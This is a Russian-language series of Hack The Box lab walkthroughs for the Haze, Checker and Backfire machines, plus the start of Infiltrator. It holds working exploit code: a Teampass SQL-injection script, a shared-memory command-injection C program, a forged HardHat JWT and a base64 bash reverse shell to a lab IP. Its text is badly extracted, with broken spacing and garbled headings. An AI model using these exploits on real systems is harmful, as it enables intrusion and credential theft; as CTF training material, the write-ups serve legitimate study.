bloodyAD -d haze.htb -u 'HAZE-IT-BACKUP$' -p ':
a70df6599d5eab1502b38f9c1c3fd828' --host 10.10.11.61 add groupMember
'SUPPORT_SERVICES' 'Haze-IT-Backup$'


                  Ре зультат выполнения команды

После   добав ления   учетной   записи   HAZE-IT-BACKUP$   в   груп пу
Support_Services снова прос каниру ем разрешения записи в атрибуты объ -
ектов AD.


bloodyAD -d haze.htb -u 'HAZE-IT-BACKUP$' -p ':
a70df6599d5eab1502b38f9c1c3fd828' --host 10.10.11.61 get writable
--right WRITE --detail



                  Разрешения для HAZE-IT-BACKUP$

Теперь поль зователь HAZE-IT-BACKUP$ имеет право записи в атрибут msDS-
KeyCredentialLink объекта Edward.Martin, а зна чит, мы можем провести
ата ку Shadow Credentials.




Техника  Shadow  Credentials  поз воляет  атакующе му  зав ладеть  учетной
записью пользователя или компьютера, если получит ся изменить атрибут
msDS-KeyCredentialLink целевого объекта и добавить к нему альтернатив -
ные учетные дан ные, такие как сер тификат. Затем по сертификату мы получим
его билет TGT, из которого извлечем NTLM-хеш пароля пользовате ля. Это все
происходит автоматически в команде certipy shadow. Но предварительно
синхро низи руем время с сервером.



faketime -f "+8h" certipy shadow auto -u 'HAZE-IT-BACKUP$@haze.htb'
-hashes ':a70df6599d5eab1502b38f9c1c3fd828' -dc-ip 10.10.11.61
-account Edward.Martin





                  Экс плу ата ция Shadow Credentials

По луча ем хеш пароля учетной записи, авторизу емся в служ бе WinRM и чита -
ем первый флаг.


evil-winrm -i 10.10.11.61 -u edward.martin -H
09e0b3eeb2e7a6b0d419e9ff8f4d91af





                       Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Просматри ваем информа цию о пользовате ле и видим, что он входит в группу
Backup_Reviewers .


whoami /all





                  Информа ция о поль зователе

Про веря ем каталоги на дис ке и находим каталог Backups . Внутри — резер -
вная копия сервиса Splunk, которую ска чиваем на свою машину через Evil-
WinRM.





                 Содер жимое каталога Backups





                      Заг рузка резервной копии

Распакуем архив и най дем в нем зашифрованные пароли по сиг натуре «дол -
лар-единица-доллар».





                       Поиск паролей

Най денный пароль расшифровыва ем с помощью секрета Splunk/etc/auth/
splunk.secret.


splunksecrets splunk-decrypt -S Splunk/etc/auth/splunk.secret





                     Расшифровывание пароля

Пароль никуда в домене не подошел, зато мы можем авторизовать ся
как Administrator сервиса Splunk.





                  Панель админис тратора Splunk

Ад минис тра тор Splunk может установить в сервисе свое приложение, а это
дает нам воз можность выполнять произвольный код от име ни учетной записи.
В качестве шаб лона приложе ния вос поль зуемся ко дом из репозитория , где
уже прописан реверс-шелл для Windows- и Unix-сис тем. Первым делом
откроем файл run.ps1 и вста вим свои данные для подключения.





                  Содержимое фай ла run.ps1

Теперь заархивиру ем каталог при ложения и сохраним в формате spl.


tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
mv reverse_shell_splunk.tgz reverse_shell_splunk.spl

Когда все будет готово, на ука занном порте запустим листенер:


rlwrap nc -nlvp 4321

Теперь перейдем на стра ницу Install  app  from  file и загрузим наш
архив.





                       Стра ница приложений





                           Загрузка файла

Вскоре в лис тенере уви дим входящее соеди нение от имени alexander.
green .





                Сессия пользователя alexander.green


System
Вни мание прив лека ют при вилегии текущего пользователя. У юзера вклю чена
привиле гия SeImpersonatePrivilege (право «Олицетворять клиента пос ле
проверки подлиннос ти»). Как говорит Microsoft:


     Ïðèñ âîåíèå ïîëüçîâàòå ëþ ïðà âà «Îëèöåòâîðÿòü êëèåíòà ïîñ ëå ïðî -
      âåð êè ïîä ëèííîñ òè» ðàç ðåøà åò ïðîãðàììàì, çàïóùåííûì îò èìå íè«
      äàííîãî ïîëüçîâàòå ëÿ, îëèöåòâîðÿòü êëèåíòà. Èñïîëüçîâàíèå äàííîãî
      ïàðàìåòðà ïðå äîòâðà ùàåò îëèöåòâîðåíèå íåàâ òîðèçîâàííûìè ñåð -
      âåðàìè êëèåíòîâ, ïîä êëþ ÷àþùèõñÿ ê ýòèì ñåð âåðàì ñ ïîìîùüþ ïðî -
      öåäóð RPC èëè èìå íîâàííûõ êàíàëîâ.                »
Дру гими словами: эта привиле гия позволяет имитировать любой токен, дес -
криптор которого мы сможем получить. Это явный вектор повышения при -
виле гий! Вос поль зуемся GodPotato для создания своего поль зовате ля.


gp.exe -cmd "cmd /c net user ralf Qwerty123 /add"





                  Ре зультат выполнения команды

Как показывает команда net users , пользователь был создан, а значит, мы
можем выполнять команды в при виле гированном кон тексте. Добавим соз -
данного поль зовате ля в груп пу админис тра торов и получим сессию через
WinRM.


.\gp.exe -cmd "cmd /c net localgroup Administrators ralf /add"


evil-winrm -i 10.10.11.61 -u ralf -p Qwerty123





                           Флаг рута

Ма шина захвачена!
ВЗЛОМ





Се годня я покажу, как можно ата ковать
приложение, исполь зующее разделяемую
память в Linux. Мы внедрим свои данные,
чтобы добиться выполнения команд в при -
вилегирован ном режиме. Но для начала          hackerralf8@gmail.comRalfHacker
проэксплуатируем баги в веб-приложе ниях
Teampass и BookStack для получения учет -
ных дан ных и сессии на сервере.


Наша конечная цель — получение прав суперпользовате ля на машине
Checker с учеб ной площадки Hack The Box . Уро вень задания — сложный.




                     Под ключать ся к машинам с HTB рекомен дуется
                        с применением средств ано ними зации и вир -
                        туализации. Не делай это го с компьютеров, где
                         есть важные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими участниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
До бавляем IP-адрес машины в /etc/hosts :


10.10.11.56    checker.htb

И запус каем сканирование портов.




Сканирование портов — стандартный первый шаг при любой атаке. Он поз -
воляет ата кующему узнать, какие службы на хос те принимают соединение.
На основе этой информа ции выбира ется следующий шаг к получе нию точки
входа.
  На иболее извес тный инс трумент для сканиро вания — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи сле дующего скрип та:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он дей ству ет в два эта па. На первом произво дится обыч ное быстрое ска -
нирование, на втором — более тщательное ска ниро вание, с использованием
имеющих ся скрип тов (опция -A ).





                    Резуль тат работы скрипта

Сканер нашел три откры тых порта:
 • 22 — служба OpenSSH 8.9p1;
 • порты 80 и 8080 — веб-сервер Apache.

Взгля нем на порты веб-сервера. На первом нас встречает форма авториза -
ции BookStack, на втором развернут сервис Teampass.





                  Страница авторизации BookStack





                  Стра ница авторизации Teampass


ÒÎ×ÊÀ ÂÕÎÄÀ

В Burp History можно увидеть обра щение к домену vault.checker.htb.





                             Burp History

Обновляем запись в фай ле /etc/hosts . На новом домене встре тим уже зна -
комый нам BookStack.


10.10.11.56 checker.htb vault.checker.htb

Так как делать боль ше нечего, стоит проверить, есть ли для обнаруженных
веб-при ложений готовые экс плоиты.





                   Поиск эксплоитов в Google

По иски при вели меня к экспло иту для уязвимос ти CVE-2023-1545 .
   Teampass до версии 3.0.0.23 уязвим к SQL-инъ екции в эндпоинте /api/
index.php/authorize. Используем следующий экс плоит и получа ем из базы
приложе ния учет ные данные.


if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi


vulnerable_url="$1/api/index.php/authorize"


check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi


# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/
iDuKlIkMbhq'


exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1),
private_key, personal_folder, fonction_id, groupes_visibles,
groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{" login ":""$inject"","password":"h4ck3d", "apikey": " foo "}"
  token=$(curl --silent --header "Content-Type: application/json" -X
POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r
'.public_key')
}


users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''"
)


echo "There are $users users in the system:"


for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw !=
'' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != ''
ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done




                    Учетные данные из базы Teampass

Осталось проб рутить хеши. Используем для это го hashcat в режиме 3200.


hashcat -m 3200 hashes.txt rockyou.txt





                    Резуль тат подбора пароля

С получен ными учетными данными авторизу емся в Teampass и собираем сох -
раненные там пароли. Получа ем ключ пользователя reader для SSH.





                   Сохраненные учетные дан ные

После авториза ции в SSH у нас запрашивается проверочный код, а зна чит,
на сервере используется двухфакторная аутен тификация.





                        Ав торизация в SSH


ÒÎ×ÊÀ ÎÏÎÐÛ

В Teampass еще есть учетные данные для входа в BookStack.





                   Сохраненные учетные дан ные





                      Глав ная страница BookStack

Чи таем дос тупные страницы в надеж де най ти что-то интересное.
  В раз деле Linux security находим информацию об использовании Google
Authenticator, а также рас кры ваем путь /backup/home_backup , куда сохраня -
ются каталоги /home .





                        Раздел Linux security

Burp составляет дерево посещенных страниц и каталогов, в данном слу чае
это помога ет нам узнать версию используемого веб-приложения — 23.10.2.





                    Дерево каталогов Burp

Как и в прош лый раз, поищем для обнаруженной вер сии известные уязвимос -
ти и публичные эксплоиты.





                   Поиск эксплоитов в Google

Ре серч по первой ссылке говорит о том, что в этой вер сии веб-приложе ния
есть уяз вимость CVE-2023-6199 и что в определен ных случаях Blind SSRF
в при ложении может при вести к LFI на сервере. Для экс плуатации уяз вимос ти
нам сперва нужно создать стра ницу и вписать рандомный тег.





                  Соз дание страницы BookStack

Теперь в Burp History най дем зап рос к API /ajax/page/<id>/save-draft .





                          Зап рос к API

Зна чения X-CSRF-TOKEN и Cookie будем использовать в готовом экс плоите
для чте ния файла, содержащего сид для генера ции одноразового пароля:


/backup/home_backup/home/reader/.google_authenticator

Эк сфиль тра ция файла про изводится посимволь но, поэтому она заняла около
девяти минут.


python3 filters_chain_oracle_exploit.py --parameter html --verb PUT
--file '/backup/home_backup/home/reader/.google_authenticator'
--target http://checker.htb/ajax/page/9/save-draft --headers '{
"X-CSRF-TOKEN":"Iqzi1thp90sOqeuYYtWy6czsqyacLI9BpL8ADkcU",
"Content-Type":"application/x-www-form-urlencoded","Cookie":
"XSRF-TOKEN=eyJp...0%3D; bookstack_session=eyJp...0%3D"}'




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



           РЕДАКТИРУЕМ РАЗДЕЛЯЕМУЮ
        ПАМЯТЬ ДЛЯ ИНЪЕКЦИИ КОМАНД
                           ОС





                       Данные для TOTP

Чтобы TOTP-код рассчи тывался с учетом времени сер вера, напишем скрипт
на Python. Он будет отправ лять HTTP-запрос на нужный веб-сервер, извле -
кать зна чение заголов ка Date из отве та и использовать это время для генера -
ции одноразового пароля на основе задан ного сек рета. Получив TOTP, сразу
авторизу емся по SSH.


import requests
import pyotp
from datetime import datetime
import time
import calendar


secret = "DVDBRAODLCWF7I2ONA4K5LQLUE"


response = requests.get("http://checker.htb")
if response.status_code == 200:
    headers = response.headers
    server_time = headers.get("Date")
    print(server_time)
    if server_time:
        dt = datetime.strptime(server_time, "%a, %d %b %Y %H:%M:%S
GMT")
        timestamp = calendar.timegm(dt.timetuple())


        totp = pyotp.TOTP(secret)
        otp_at_time = totp.at(timestamp)


        print(otp_at_time)




                       Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Первым делом проверим нас тройки sudoers.


sudo -l




                       Настрой ки sudoers

Судя по ним, мы можем без ввода пароля выполнить команду /opt/hash-
checker/check-leak.sh в привилегирован ном контек сте. Проверим, что
внут ри у этого скрипта.




                Содержимое фай ла check-leak.sh

В скрип те производится запуск файла /opt/hash-checker/check_leak .
Как показа ла утилита file , файл представляет собой полноценный ELF —
исполня емый код для Linux.


                 Информация о фай ле check_leak

Сде лав пару тес товых записей, понимаем, что файлу нуж но указать не сис -
темных поль зователей, а одного из пользователей Teampass.




                     Тестовый запуск приложе ния

Рядом с ELF можно най ти и файл с хешами.





              Содер жимое файла leaked_hashes.txt

Скачиваем файл check_leak на свой хост для ана лиза. В качес тве дизас сем -
блера с декомпилятором я исполь зую IDA Pro. Начинаем анализ с функции
main .
  Интерес пред став ляют самописные функции write_to_shm (строка 71)
и notify_user (стро ка 77). Между вызовами этих фун кций исполь зуется
задержка sleep() на одну секунду (строка 76).





                        Код функции main

В функции write_to_shm псевдослучай ным образом генерируется ключ
для shmget (строки 30–33). Эта функция свя зывает ключ с разделяемым
(общим) сег ментом памяти.





                     Код функции write_to_shm

Зная ключ, с которым связана общая память, мы можем подключить в свой
процесс этот же сегмент памяти. Так как ключ генерируется на основе зна -
чения time(0) , мы можем предугадать значение клю ча в опре деленный
момент времени.
  В функции notify_user происходит проверка значения в общей памяти.
Блоб данных должен содержать строку Leaked hash detected (строки 53–
58). Затем происходит проверка наличия в строке символа с кодом 62 (сим -
вол > , строка 59).





                      Код функции notify_user

Да лее формируется команда mysql , которая выполняется в сис темном тер -
минале (стро ки 78–95).





                      Код функции notify_user

Переменная v19 в коде выше связана с общей памятью, а зна чит, если мы
получим доступ к ней, запишем стро ку Leaked hash detected и символ > ,
зак роем команду mysql символами '; и переда дим команду chmod u+s /
bin/bash;  # ,  то  у нас  получится проэкс плуати ровать  уязвимость OS
Command Injection. Формировать ключ будем как в исходной коман де.


#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>


int main() {
    srand((unsigned int)time(NULL));
    key_t key = rand() % 0xFFFFF;


    int shmid = shmget(key, 0x400, IPC_CREAT | 0666);
    if (shmid < 0) {
        perror("error shmget");
        return 1;
    }


    char *share_memory = (char*) shmat(shmid, NULL, 0);
    if (share_memory == (char*)-1) {
        perror("error shmat");
        return 1;
    }


    const char *message = "Leaked hash detected > '; chmod u+s /bin/
bash; #";
    snprintf(share_memory, 0x400, "%s", message );


    if (shmdt(share_memory) == -1) {
        perror("error shmdt");
        return 1;
    }


    return 0;
}

Скомпилируем код и запус тим в бес конечном цик ле.


gcc expl.c -o expl.bin
while true; do ./expl.bin; done

В дру гом терминале запус тим целевую прог рамму в привилегированном кон -
тексте.


sudo /opt/hash-checker/check-leak.sh bob

В консоли появит ся ошибка SQL, а значит, мы смог ли выпол нить инъ екцию
команды. Проверим пра ва на файл командной обо лочки /bin/bash .





                     Эксплуата ция уязвимос ти




Когда у файла установ лен атрибут setuid (S-атрибут), обычный пользователь,
запус кающий этот файл, получа ет повышение прав до пользователя — вла-
дель ца файла в рамках запущенного процесса.


Запус тим командную оболочку от име ни пользователя root .





                           Флаг рута

Ма шина захвачена!
ВЗЛОМ





В этой статье я покажу, как уяз вимости
в C2-фреймвор ках Havoc и HardHat могут
привести    к   компрометации    хоста,
на котором они раз верну ты. Для даль -
                                                                                         RalfHacker
                                                                                             hackerralf8@gmail.comнейшего  повышения   привиле гий  мы
используем  спо соб  переза писи фай лов
командой sudo iptables.


Наша цель — получе ние прав суперпользователя на машине Backre с учеб -
ной площадки Hack The Box . Уровень сложности задания — средний.




                     Под ключать ся к машинам с HTB рекомен дуется
                        с применением средств ано ними зации и вир -
                        туализации. Не делай это го с компьютеров, где
                         есть важные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими участниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
До бавляем IP-адрес машины в /etc/hosts :


10.10.11.49    backfire.htb

И запус каем сканирование портов.




Сканирование портов — стандартный первый шаг при любой атаке. Он поз -
воляет ата кующему узнать, какие службы на хос те принимают соединение.
На основе этой информа ции выбира ется следующий шаг к получе нию точки
входа.
  На иболее извес тный инс трумент для сканиро вания — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи сле дующего скрип та:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он дей ству ет в два эта па. На первом произво дится обыч ное быстрое ска -
нирование, на втором — более тщательное ска ниро вание, с использованием
имеющих ся скрип тов (опция -A ).





                    Резуль тат работы скрипта

Сканер нашел три откры тых порта:
 • 22 — служба OpenSSH 9.2p1;
 • порты 443 и 8000 — веб-сер вер Nginx 1.22.1.

Также скан показывает, что корневой каталог сайта на порте 8000 не имеет
индекс-фай ла, а зна чит, нам доступно все содержимое каталога.





           Содержимое кор невого каталога на порте 8000


ÒÎ×ÊÀ ÂÕÎÄÀ

В корневом каталоге два фай ла: какой-то патч disable_tls.patch и файл
профиля для C2-фрей мворка Havoc havoc.yaotl . В файле профиля содер -
жатся учетные дан ные для подключения к серверу C2.





                 Содержимое фай ла havoc.yaotl




C2-фрей мворк (Command and Control, так же С&C) — это программная плат -
форма, которая используется для уда ленного управления зараженными
устрой ства ми в инфраструктуре атакующе го. Такие фреймворки обеспечива-
ют каналы свя зи между оператором и ском прометирован ными машинами,
позволяя выполнять команды, загружать и скачивать фай лы, собирать дан ные
и управлять вредоносной активностью. Они широко применяются при тес-
тировании на проник новение, кибершпи онаже и ата ках типа APT, предос -
тавляя  гиб кий  и  часто  модульный  интерфейс  для  скры того  контроля
над целевы ми системами.



В репози тории c2-vulnerabilities содержатся экс плоиты для некото рых C2-
фреймворков, а под робное опи сание есть в блоге . Среди перечисленных
фреймворков есть и используемый на сервере Havoc.





                  Содер жимое репозитория

Эксплоит из репозитория поз воля ет получить RCE за счет уязвимости OS
Command Injection в генераторе агента. Команда для сбор ки аген та переда -
ется в командную обо лочку /bin/sh на сервере Havoc, а имя службы зада -
ется через переменную окру жения. Таким образом, если использовать наг -
рузку с реверс-шеллом в качес тве имени службы, можно получить воз -
можность выполнить реверс-шелл в командной строке.
  Од нако подключиться к C2 не выйдет, так как порт 40056 прос лушивается
толь ко для адреса 127.0.0.1. При этом в патче под ключение с использовани -
ем SSL заменяется обыч ным незащи щенным соединением.





               Содержимое фай ла disable_tls.patch

Однако в фрей мвор ке есть еще одна уязвимость — SSRF, через которую мы
можем дос тучаться до сервера C2 и проэкс плу атировать RCE. Подробный
анализ уяз вимос ти SSRF можно пос мотреть в пос те из блога chebuya. Мы же
будем использовать уже готовый экс плоит SSRF + RCE .
  В коде эксплоита заменим зна чение переменной cmd реверс-шеллом,
который сгенерируем на сайте Reverse Shell Generator .


cmd = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80MzIxIDA+JjE=
| base64 -d | bash"





                    Ис ходный код экс плоита





                   Сгенерированный реверс-шелл

Для работы скрип та дос тавим необходимые зависи мости.


python3 -m venv venv
source venv/bin/activate
pip install websocket-client requests pycryptodome

Для ожи дания соединения с реверс-шеллом запустим листенер:


pwncat-cs -lp 4321

Когда все готово, запус каем экс плоит.


python3 CVE-2024-41570.py -t https://10.10.11.49 -i 127.0.0.1 -p
40056 -U 'ilya' -P 'CobaltStr1keSuckz!'





                    Ре зультат работы экс плоита

Эксплоит автомати чески достучался до сервера Havoc через SSRF, создал
лис тенер, а потом сгенерировал агент для получения RCE.





                    Сессия пользователя ilya

Сес сия быстро умирает, поэтому для зак репле ния на хосте сгенерируем пару
клю чей командой ssh-keygen и сохраним пуб личный ключ на сервере.


echo 'ssh-ed25519 AAAA.....urp hacker' > ~/.ssh/authorized_keys

Ав торизуемся по SSH с приватным клю чом и забираем пользовательский
флаг.




                       Флаг поль зователя


ÏÐÎÄÂÈÆÅÍÈÅ

Теперь нам необ ходимо соб рать информа цию, которая поможет повысить
права. Для это го нужно про верить мно гие мес та в Linux, для чего я по тра -
диции буду использовать скрипты PEASS.




Что делать после того, как мы получили доступ в систему от имени поль -
зовате ля? Вариантов дальнейшей экс плуатации и повыше ния привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информа цию и наметить  цели, можно использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис -
тему на автомате и выда ют под робный отчет о потен циаль но инте ресных
фай лах, процес сах и настройках.



Загрузим на уда ленный хост скрипт, дадим право на выполнение и запус тим
сканирование. Затем разберем ся в том, что оно нам дало.
  На рабочем столе есть какой-то файл hardhat.txt.




                 Содержимое фай ла hardhat.txt

От имени поль зователя sergej запущены сервер и клиент C2-фреймворка
HardHat C2 .



                      Де рево процес сов

Среди активных портов есть типич ные для HardHat 5000 и 7096.





                     Прос лушиваемые пор ты

По ищем, нет ли и в этом фреймвор ке извес тных уяз вимостей.





                   Поиск эксплоитов в Google

Через Google выходим на статью « HardHatC2 0-Days (RCE & AuthN Bypass) »,
в которой опи саны уяз вимос ти обхода авторизации и последу ющая эксплу -
ата ция RCE в HardHat. Чтобы получить дос туп к серверу HardHat, нужно про -
кинуть порты 5000 и 7096.


ssh -i id_rsa ilya@10.10.11.49 -L 7096:127.0.0.1:7096 -L 5000:127.0.
0.1:5000

В  резуль тате  весь  трафик,  который мы пошлем  на  локальные  пор -
ты 5000 и 7096, будет туннелирован на соответству ющие порты указанного
хоста (в данном слу чае 127.0.0.1) через SSH-хост.





                  Стра ница авторизации HardHat C2

В  конце  статьи  был  эксплоит,  уста новим  свои  переменные  rhost
и burp0_json . Затем установим pyjwt и выполним код для создания своего
пользователя.


pip install pyjwt


import jwt
import datetime
import uuid
import requests


rhost = '127.0.0.1:5000'


# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()


expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/
nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "
Administrator"
}


token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)


# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "ralf"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json,
verify=False)
print(r.text)





             Экс плу атация уязвимости обхода авторизации

Теперь можно авторизоваться от имени созданного поль зователя.





                      Главная панель HardHat C2

Теперь переходим к пункту меню ImplantInteract     Terminal и выпол няем
команду id .





                 Результат выполнения команды id

Записы ваем пользователю sergej свой ключ SSH и авторизу емся по SSH.





                   Сессия пользователя sergej


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Разведку на хосте уже проводи ли, и со сме ной поль зователя в Linux мало что
меняется. Но все же некоторые места нужно про верить заново. Одно из таких
мест — нас трой ки sudoers.


sudo -l





                       Настрой ки sudoers

Наш поль зователь может запустить коман ды /usr/sbin/iptables и /usr/
sbin/iptables-save от име ни рута. В базе GTFOBins по iptables ничего нет,
попробуем поис кать какие-нибудь уязвимости в блогах.





                   Поиск путей LPE в Google

По первой же ссыл ке находим нужную нам информа цию. В iptables пра вилам
можно добавить комментарии, которые поддерживают сим волы перевода
строк. При этом команда iptables-save может сохранить все текущие пра -
вила в произволь ный файл.
   Таким образом, используя функцию ком мента риев с переводом строк, мы
можем соз дать такое пра вило, которое в новой строке будет содержать пуб -
личный SSH-ключ.


sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n
ssh-ed25519
AAAAC3NzaC1lZDI1NTE5AAAAIA4Ut1gVY7GnFY8dsp4ueaFVORzW7zyPqWoa/pydVurp
X1\n'





                        Пра вила iptables

А теперь сох раним все правила в файл /root/.ssh/authorized_keys.


sudo iptables-save -f /root/.ssh/authorized_keys

При авториза ции по SSH с при ватным клю чом он будет соотнесен с записан -
ным ранее пуб личным, и мы получим дос туп от имени пользовате ля root.





                           Флаг рута

Ма шина захвачена!
ВЗЛОМ





Мы про ведем классичес кий сбор данных
в  Active  Directory и через цепочку раз -
решений    скомпрометируем    учетную
запись, с которой получим сессию на хос те.
Затем извлечем дан ные из мессенджера,          hackerralf8@gmail.comRalfHacker
вскроем приложение на .NET и про эксплу -
атируем планировщик задач для получе ния
слу жеб ной учетной записи. Повысим при -
вилегии через технику ESC4 для службы
ADCS.


Наша цель — получение прав суперпользовате ля на машине Inltrator с учеб -
ной площадки Hack The Box . Уровень сложности задания — «безум ный».




                     Под ключать ся к машинам с HTB рекомен дуется
                        с применением средств ано ними зации и вир -
                        туализации. Не делай это го с компьютеров, где
                         есть важные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими участниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
До бавляем IP-адрес машины в /etc/hosts :


10.10.11.31 infiltrator.htb

И запус каем сканирование портов.




Сканирование портов — стандартный первый шаг при любой атаке. Он поз -
воляет ата кующему узнать, какие службы на хос те принимают соединение.
На основе этой информа ции выбира ется следующий шаг к получе нию точки
входа.
  На иболее извес тный инс трумент для сканиро вания — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи сле дующего скрип та:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он дей ству ет в два эта па. На первом произво дится обыч ное быстрое ска -
нирование, на втором — более тщательное ска ниро вание, с использованием
имеющих ся скрип тов (опция -A ).





                    Резуль тат работы скрипта

Сканер нашел 13 откры тых портов:
 • 80 (HTTP) — веб-сервер Microsoft IIS/10.0;
 • 88 — Kerberos;
 • 135 — Microsoft RPC;
 • 139 — NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в служ бах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для дос тупа к Global Catalog от клиента к кон троллеру;
 • 3269 (LDAPS) — для дос тупа к Global Catalog от клиента к кон троллеру
   через защищенное соеди нение;
 • 3389 — служба уда ленного рабоче го стола;
 • 5985 — служба уда ленного управле ния WinRM.

До бавим в /etc/hosts еще и полное имя машины, а затем начнем разведку
с изу чения сай та.


10.10.11.31 infiltrator.htb dc01.infiltrator.htb dc01





                        Главная страница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

На сай те находим список сотрудников. Выписываем их в отдельный файл.





                       Сотрудники компании

С помощью сле дующего скрип та мы можем сос тавить список возможных
учет ных записей в домене.


import sys


if len(sys.argv)==1:
    print("Usage: " + sys.argv[0] + " <usernames.txt>")
    sys.exit(1)


names = open(sys.argv[1],"r").read().strip().split('\n')
list = []
for name in names:
    n1, n2 = name.split(' ')
    list.append(n1)
    list.append(n1+n2)
    list.append(n1+"."+n2)
    list.append(n1+"-"+n2)
    list.append(n1+"_"+n2)
    list.append(n1+n2[0])
    list.append(n1+"."+n2[0])
    list.append(n1+"-"+n2[0])
    list.append(n1+"_"+n2[0])
    list.append(n2[0]+n1)
    list.append(n2[0]+"."+n1)
    list.append(n2[0]+"-"+n1)
    list.append(n2[0]+"_"+n1)
    list.append(n2)
    list.append(n2+n1)
    list.append(n2+"."+n1)
    list.append(n2+"-"+n1)
    list.append(n2+"_"+n1)
    list.append(n2+n1[0])
    list.append(n2+"."+n1[0])
    list.append(n2+"-"+n1[0])
    list.append(n2+"_"+n1[0])
    list.append(n1[0]+n2)
    list.append(n1[0]+"."+n2)
    list.append(n1[0]+"-"+n2)
    list.append(n1[0]+"_"+n2)


for n in list:
    print(n)


python3 getusers.py team.txt > pos_users.txt

Теперь можно использовать инс трумент Kerbrute для опре деления учетных
записей, которые реально существу ют в домене. Дело в том, что Kerberos
возвращает разные коды ошибок для существу ющей и несущес твующей учет -
ных записей.


kerbrute_linux_amd64 userenum -d infiltrator.htb --dc dc01.
infiltrator.htb pos_users.txt





                        Учетные записи в домене

Имея спи сок дей ствительных учетных записей, мож но провес ти атаку AS-REP
Roasting. Если в UAC пользователя установ лен флаг «Без предваритель ной
проверки под линнос ти Kerberos», то мы можем получить TGT-билет поль -
зовате ля без верного пароля, а затем сбру тить пароль офлайн.


GetNPUsers.py -dc-ip 10.10.11.31 infiltrator.htb/ -usersfile users.
txt -no-pass





                Проведение атаки AS-REP Roasting

По луча ем хеш поль зователя L.Clark и можем его пробрутить с помощью
hashcat . Затем валидируем учет ные дан ные через NetExec .


hashcat hash.txt rockyou.txt





                    Резуль тат подбора пароля


nxc smb 10.10.11.31 -u 'L.Clark' -p 'WAT?watismypass!'



                    Проверка учетных данных

По лучив валидные логин и пароль, собираем информа цию из домена. Пер -
вым делом получа ем список всех пользовате лей.


nxc smb 10.10.11.31 -u 'L.Clark' -p 'WAT?watismypass!' --users





                       Поль зователи домена

В описании одной учетной записи есть строка, похожая на пароль. Сох раня -
ем всех юзеров в файл и пробуем использовать найден ную строку как пароль
для дру гих аккаунтов.


nxc smb 10.10.11.31 -u users.txt -p passwords.txt
--continue-on-success





                       Результат перебора

На      некоторых      учетных      записях      получаем     ошиб ку
STATUS_ACCOUNT_RESTRICTION , а зна чит, повторим перебор, но теперь
с использовани ем аутентификации Kerberos.


